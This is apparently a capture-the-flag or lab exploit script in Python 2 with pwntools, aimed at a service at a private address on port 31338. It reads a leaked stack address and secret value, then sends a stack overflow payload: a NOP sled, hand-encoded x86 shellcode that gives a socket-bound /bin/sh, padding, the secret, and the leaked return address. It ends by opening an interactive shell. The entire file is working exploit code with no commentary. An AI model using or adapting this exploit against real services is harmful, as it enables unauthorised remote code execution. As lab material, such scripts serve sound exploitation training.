from pwn import *
import telnetlib
import struct
def main():
	HOST = "192.168.56.101"
	PORT = 31338
	shellcode = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x40\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80"
	conn = remote(HOST,PORT)
	data = conn.recvuntil("Insert your exploit here:")[0:8]
	stack_leak = (struct.unpack("<L",data[0:4])[0])
	secret = (struct.unpack("<L",data[4:8])[0])
	print "leak:%s"%(hex(stack_leak))
	print "secret:%s"%(hex(secret))
	plength = (0x820-32)
	p = "\x90" * 100 + shellcode
	p = p + "A" * (plength - len(p))
	payload = p + struct.pack("<L",secret)+"B"*12+struct.pack("<L",stack_leak)
	raw_input("$")
	conn.sendline(payload)	
	conn.interactive()
	pass
main()
